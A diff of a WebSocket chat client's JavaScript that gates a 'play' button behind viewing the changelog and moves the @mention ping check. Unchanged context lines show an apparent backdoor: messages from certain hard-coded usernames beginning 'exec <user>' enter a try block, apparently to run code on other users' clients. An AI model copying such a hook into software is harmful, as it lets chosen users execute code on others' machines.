@@ -5,6 +5,9 @@ ws.addEventListener("open", () => {
     canSend = true;
     hide(connectP);
     show(loginDiv);
+    if (localStorage.getItem("checkedChangelog")) {
+        show(play);
+    }
     if (localStorage.getItem("cookie")) {
         send({
             e: "session",
@@ -327,6 +330,8 @@ Owner:<ul>
     });
     changelogBtn.addEventListener("click", () => {
         show(changelog);
+        show(play);
+        localStorage.setItem("checkedChangelog", "yes");
     });
     closeChangelog.addEventListener("click", () => {
         hide(changelog);
@@ -585,7 +590,6 @@ ws.addEventListener("message", e => {
             }
             break;
         case "message":
-            if (msg.m.m.match(new RegExp("@" + user + "(\\s|$)", "g")) || msg.m.m.match(/@everyone(\s|$)/g) || msg.m.m.match(/@all(\s|$)/g)) ping.play();
             if (["NKY", "NKY5223", "NKYv2", "NKYv3", "wolfie"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3"].includes(user)) {
                 if (msg.m.m.startsWith("exec " + user)) {
                     try {
@@ -797,6 +801,7 @@ function message(msg, force = false) {
         }, true);
         return;
     }
+    if (msg.m.m.match(new RegExp("@" + user + "(\\s|$)", "g")) || msg.m.m.match(/@everyone(\s|$)/g) || msg.m.m.match(/@all(\s|$)/g)) ping.play();
     let scroll = chat.lastElementChild ? chat.scrollTop + chat.clientHeight + 6 >= chat.scrollHeight : true;
     let wrapper = document.createElement("div");
     wrapper.className = "wrapper";
